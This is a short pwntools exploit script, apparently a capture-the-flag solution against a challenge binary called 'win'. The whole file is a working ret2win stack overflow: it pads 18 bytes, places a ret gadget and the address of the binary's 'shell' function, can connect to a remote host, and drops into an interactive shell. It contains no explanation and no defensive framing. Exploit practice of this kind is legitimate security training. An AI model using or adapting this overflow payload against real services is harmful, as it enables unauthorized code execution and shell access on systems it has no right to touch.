#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'win')
elf = exe
libc = elf.libc
filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *intro+105
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io
    global elf

    io = start()

def leak():
    offset = 18
    ret = 0x000000000040101a
    payload = flat({
        offset: [
            ret,
            elf.sym['shell']
        ]
    })

    io.sendline(payload)

def main():
    
    init()
    leak()

if __name__ == '__main__':
    main()

    io.interactive()
